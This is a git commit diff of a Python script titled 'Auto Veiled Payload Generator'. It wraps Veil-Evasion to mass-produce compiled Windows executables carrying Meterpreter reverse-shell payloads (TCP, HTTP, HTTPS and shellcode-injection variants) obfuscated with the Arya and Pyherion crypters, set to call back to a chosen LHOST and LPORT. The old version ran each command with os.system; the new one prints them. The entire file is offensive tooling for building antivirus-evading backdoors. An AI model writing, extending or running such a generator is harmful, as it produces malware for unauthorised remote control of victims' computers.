5d73075590a34cd645ccb3db923e363de8006ef8
hacip <mert@hacip.net>
2015-01-26 15:25:05 +0200

    son

--- src/main.py
+++ src/main.py
@@ -1,45 +1,49 @@
 import os
 import argparse
 
-veil_path = "/root/Veil-Evasion/Veil-Evasion.py"
-payload_list=["auxiliary/coldwar_wrapper",
-              "auxiliary/pyinstaller_wrapper",
-              "c/meterpreter/rev_http",
-              "c/meterpreter/rev_http_service",
-              "c/meterpreter/rev_tcp",
-              "c/meterpreter/rev_tcp_service",
-              "c/shellcode_inject/flatc",
-              "cs/meterpreter/rev_http",
-              "cs/meterpreter/rev_https",
-              "cs/meterpreter/rev_tcp",
-              "cs/shellcode_inject/base64_substitution",
-              "cs/shellcode_inject/virtual","native/Hyperion",
-              "native/backdoor_factory","native/pe_scrambler",
-              "powershell/meterpreter/rev_http",
-              "powershell/meterpreter/rev_https",
-              "powershell/meterpreter/rev_tcp",
-              "powershell/shellcode_inject/download_virtual",
-              "powershell/shellcode_inject/psexec_virtual",
-              "powershell/shellcode_inject/virtual",
-              "python/meterpreter/rev_http",
-              "python/meterpreter/rev_http_contained",
-              "python/meterpreter/rev_https",
-              "python/meterpreter/rev_https_contained",
-              "python/meterpreter/rev_tcp",
-              "python/shellcode_inject/aes_encrypt",
-              "python/shellcode_inject/arc_encrypt",
-              "python/shellcode_inject/base64_substitution",
-              "python/shellcode_inject/des_encrypt",
-              "python/shellcode_inject/flat",
-              "python/shellcode_inject/letter_substitution",
-              "python/shellcode_inject/pidinject",
-              "ruby/meterpreter/rev_http",
-              "ruby/meterpreter/rev_http_contained",
-              "ruby/meterpreter/rev_https",
-              "ruby/meterpreter/rev_https_contained",
-              "ruby/meterpreter/rev_tcp",
-              "ruby/shellcode_inject/flat"]
+veil_path = "/root/veil/Veil-Evasion/Veil-Evasion.py"
 
+payload_list={
+              ("c/meterpreter/rev_http","compile_to_exe=Y use_arya=Y"),
+              ("c/meterpreter/rev_http_service","compile_to_exe=Y use_arya=Y"),
+              ("c/meterpreter/rev_tcp","compile_to_exe=Y use_arya=Y"),
+              ("c/meterpreter/rev_tcp_service","compile_to_exe=Y use_arya=Y"),
+              ("c/shellcode_inject/flatc","compile_to_exe=Y use_arya=Y --msfpayload=windows/meterpreter/reverse_tcp"),
+              ("cs/meterpreter/rev_http","compile_to_exe=Y use_arya=Y"),
+              ("cs/meterpreter/rev_https","compile_to_exe=Y use_arya=Y"),
+              ("cs/meterpreter/rev_tcp","compile_to_exe=Y use_arya=Y"),
+              ("cs/shellcode_inject/base64_substitution","compile_to_exe=Y use_arya=Y"),
+              ("cs/shellcode_inject/virtual","compile_to_exe=Y use_arya=Y"),
+              ("powershell/meterpreter/rev_http","compile_to_exe=Y use_arya=Y"),
+              ("powershell/meterpreter/rev_https","compile_to_exe=Y use_arya=Y"),
+              ("powershell/meterpreter/rev_tcp","compile_to_exe=Y use_arya=Y"),
+              ("powershell/shellcode_inject/psexec_virtual","compile_to_exe=Y use_arya=Y"),
+              ("powershell/shellcode_inject/virtual","compile_to_exe=Y use_pyherion=Y"),
+              ("python/meterpreter/rev_http","compile_to_exe=Y use_pyherion=Y"),
+              ("python/meterpreter/rev_http_contained","compile_to_exe=Y use_pyherion=Y"),
+              ("python/meterpreter/rev_https","compile_to_exe=Y use_pyherion=Y"),
+              ("python/meterpreter/rev_https_contained","compile_to_exe=Y use_pyherion=Y"),
+              ("python/meterpreter/rev_tcp","compile_to_exe=Y use_arya=Y use_pyherion=Y"),
+              ("python/shellcode_inject/aes_encrypt","compile_to_exe=Y use_pyherion=Y"),
+              ("python/shellcode_inject/arc_encrypt","compile_to_exe=Y use_pyherion=Y"),
+              ("python/shellcode_inject/base64_substitution","compile_to_exe=Y use_pyherion=Y"),
+              ("python/shellcode_inject/des_encrypt","compile_to_exe=Y use_pyherion=Y"),
+              ("python/shellcode_inject/flat --msfpayload=windows/meterpreter/reverse_tcp","compile_to_exe=Y use_pyherion=Y"),
+              ("python/shellcode_inject/letter_substitution","compile_to_exe=Y use_pyherion=Y"),
+              ("python/shellcode_inject/pidinject","compile_to_exe=Y use_pyherion=Y"),
+              ("ruby/meterpreter/rev_http","compile_to_exe=Y use_arya=Y"),
+              ("ruby/meterpreter/rev_http_contained","compile_to_exe=Y use_arya=Y"),
+              ("ruby/meterpreter/rev_https","compile_to_exe=Y use_arya=Y"),
+              ("ruby/meterpreter/rev_https_contained","compile_to_exe=Y use_arya=Y"),
+              ("ruby/meterpreter/rev_tcp","compile_to_exe=Y use_arya=Y"),
+              ("ruby/shellcode_inject/flat","compile_to_exe=Y use_arya=Y")
+              }
+
+def CreatePayloadCommand(payload_tuple,LHOST,LPORT,path):
+    file_name=payload_tuple[0].split("/")
+    file_name=file_name[len(file_name)-3]+"_"+file_name[len(file_name)-2]+"_"+file_name[len(file_name)-1]+".exe"
+    print "python "+veil_path+" -p "+payload_tuple[0]+" -c "+payload_tuple[1]+" LHOST="+LHOST+" LPORT="+LPORT+" --overwrite -o "+file_name
+    
 parser = argparse.ArgumentParser(description='Auto Veiled Payload Generator')
 parser.add_argument('-LHOST',metavar='[x.x.x.x]',type=str,help='Local IP Address',required=True)
 parser.add_argument('-LPORT',metavar='PORT NO', type=str,help="Port No",required=True)
@@ -57,13 +61,6 @@ else:
 if not os.path.exists(path):
     os.makedirs(path)
 
-
-# create command for each payload
-def createCommandStr(payload):
-    of=payload.split("/")
-    return "python "+veil_path+" -p "+payload+" -c LHOST="+args.LHOST+" LPORT="+args.LPORT+" compile_to_exe=Y -o "+path+of[len(of)-2]+"_"+of[len(of)-1]+".exe --overwrite"
-
-
-
 for payload in payload_list:
-    os.system(createCommandStr(payload))
+    CreatePayloadCommand(payload, args.LHOST, args.LPORT, path)
+    
